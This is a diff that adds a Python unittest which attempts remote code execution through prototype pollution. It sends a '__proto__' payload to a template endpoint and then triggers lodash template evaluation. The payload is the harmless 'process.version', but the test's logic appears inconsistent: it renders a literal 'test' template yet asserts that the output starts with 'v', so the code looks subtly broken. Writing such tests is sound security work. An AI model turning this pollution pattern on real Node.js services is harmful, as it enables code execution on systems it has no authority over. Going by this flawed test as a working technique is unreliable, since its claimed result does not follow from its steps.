@@ -133,6 +133,30 @@ class PrototypePollutionTest(unittest.TestCase):
         self.assertIn('deep', verify.json())
         self.assertEqual(verify.json()['deep'], 'recursion')
 
+    def test_08_rce_through_pollution(self):
+        """Test RCE through prototype pollution."""
+        # First pollute the prototype with RCE payload
+        response = requests.post(f"{TEMPLATE_ENDPOINT}", json={
+            'name': 'RCE Attack',
+            '__proto__': {
+                'rce': 'process.version'  # Safe payload to get Node.js version
+            }
+        })
+        self.assertEqual(response.status_code, 200)
+        print("\n[*] RCE Test - Prototype pollution response:", response.text)
+
+        # Then trigger RCE through template evaluation
+        eval_response = requests.post(f"{TEMPLATE_ENDPOINT}/evaluate", json={
+            'template': '<%= "test" %>',  # Valid lodash template
+            'context': {}
+        })
+        print("[*] RCE Test - Template evaluation response:", eval_response.text)
+        self.assertEqual(eval_response.status_code, 200)
+        self.assertIn('result', eval_response.json())
+        # Result should contain Node.js version string starting with 'v'
+        self.assertTrue(eval_response.json()['result'].startswith('v'))
+        print("[*] RCE Test - Node.js version:", eval_response.json()['result'])
+
 def main():
     unittest.main(verbosity=2)
 
